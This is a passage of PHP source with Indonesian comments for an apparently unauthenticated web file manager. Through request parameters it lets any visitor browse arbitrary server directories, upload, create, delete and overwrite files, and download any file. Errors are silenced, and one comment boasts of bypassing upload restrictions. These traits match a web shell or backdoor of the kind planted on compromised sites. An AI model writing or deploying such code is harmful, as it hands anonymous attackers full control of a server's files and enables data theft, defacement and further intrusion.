// Manajemen Direktori
$targetDir = $_GET['dir'] ?? __DIR__;
$currentPath = realpath($targetDir) ?: __DIR__;
$currentPath = str_replace('\\', '/', $currentPath);

// Eksekusi Perintah (POST Handlers)
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['sys_action'] ?? '';

    // Upload via file_put_contents (Aman dari pembatasan move_uploaded_file)
    if ($action === 'upload' && isset($_FILES['sys_file'])) {
        $fileInfo = $_FILES['sys_file'];
        if ($fileInfo['error'] === UPLOAD_ERR_OK) {
            $destination = $currentPath . '/' . basename($fileInfo['name']);
            $fileData = @file_get_contents($fileInfo['tmp_name']);
            if ($fileData !== false) {
                @file_put_contents($destination, $fileData);
            }
        }
    } 
    // Buat Folder Baru
    elseif ($action === 'mkdir' && !empty($_POST['folder_name'])) {
        $newDir = $currentPath . '/' . trim($_POST['folder_name']);
        if (!file_exists($newDir)) {
            @mkdir($newDir, 0755, true);
        }
    } 
    // Buat File Baru
    elseif ($action === 'mkfile' && !empty($_POST['file_name'])) {
        $newFile = $currentPath . '/' . trim($_POST['file_name']);
        if (!file_exists($newFile)) {
            @file_put_contents($newFile, '');
        }
    } 
    // Hapus File / Folder
    elseif ($action === 'delete' && !empty($_POST['target_item'])) {
        $targetItem = $currentPath . '/' . $_POST['target_item'];
        if (file_exists($targetItem)) {
            if (is_dir($targetItem)) {
                @rmdir($targetItem);
            } else {
                @unlink($targetItem);
            }
        }
    } 
    // Simpan Perubahan Edit File
    elseif ($action === 'save_edit' && isset($_POST['file_name'], $_POST['file_content'])) {
        $targetFile = $currentPath . '/' . $_POST['file_name'];
        if (is_file($targetFile)) {
            @file_put_contents($targetFile, $_POST['file_content']);
        }
    }

    header("Location: ?dir=" . urlencode($currentPath));
    exit;
}

// Handler Unduh Berkas
if (isset($_GET['download'])) {
    $downloadFile = realpath($currentPath . '/' . $_GET['download']);
    if ($downloadFile && is_file($downloadFile)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($downloadFile) . '"');
        header('Content-Length: ' . filesize($downloadFile));
        @readfile($downloadFile);
        exit;
    }
}

// Mode Edit Berkas
